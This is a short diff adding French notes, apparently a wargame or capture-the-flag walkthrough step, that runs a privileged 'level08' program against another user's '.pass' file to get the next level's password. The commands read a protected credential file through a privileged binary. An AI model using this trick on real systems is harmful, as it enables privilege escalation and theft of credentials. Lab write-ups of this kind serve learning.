@@ -1,0 +1,11 @@
+cd tmp
+creer le chemin pour acceder au .pass
+mkdir -p backups/home/users/level09
+
+et lamcer le programme sur le .pass
+~/level08 /home/users/level09/.pass
+
+cat ~/level08 /home/users/level09/.pass
+
+GG!
+
